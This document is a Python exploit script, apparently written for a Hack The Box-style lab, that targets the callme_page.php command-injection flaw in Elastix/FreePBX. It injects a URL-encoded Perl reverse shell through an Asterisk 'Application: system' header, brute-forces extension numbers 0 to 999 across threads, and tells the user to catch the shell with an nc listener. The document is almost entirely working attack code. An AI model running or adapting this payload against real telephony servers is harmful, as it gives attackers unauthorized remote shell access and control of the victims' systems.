#!/usr/bin/python3
# Inspired by https://www.exploit-db.com/exploits/18650
# Run this script while listening on LPORT (e.g.; nc -nlvp 9999)

import requests
import urllib3
import ssl
import sys
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context

PROXIES = {
    'http': "http://127.0.0.1:8080",
    'https': "https://127.0.0.1:8080"
}

RHOST="10.10.10.7"      # Target Host IP address
LHOST="10.10.14.168"    # tun0 IP address
LPORT=9999              # Port number where to listen

def send_request(extension):
    try:
        print(f'Sending request with extension {extension} ...')
        url = f'https://{RHOST}/recordings/misc/callme_page.php?action=c&callmenum={extension}@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22{LHOST}%3a{LPORT}%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
        response = requests.get(url, verify=False)
        #response = requests.get(url, proxies=PROXIES, verify=False)
        content_length = int(response.headers.get("Content-Length", 0))
        # After some testing, when the extension is valid, the content-length of the response header is equal to 1197 (bigger than the content-length of an invalid extension, which is 947)
        if content_length > 950:
            print()
            print(f"Found valid extension value: {extension}")
            print("Reverse shell triggered, check your netcat listener on port {LPORT}")
            print('')
            print('Happy Hacking ;)')

    except Exception as e:
        print(e)

# Use threading to send requests concurrently
with ThreadPoolExecutor() as executor:
    # Testing extension values from 0 to 1000 until the reverse shell is triggered.
    extensions = range(1000) 
    executor.map(send_request, extensions)
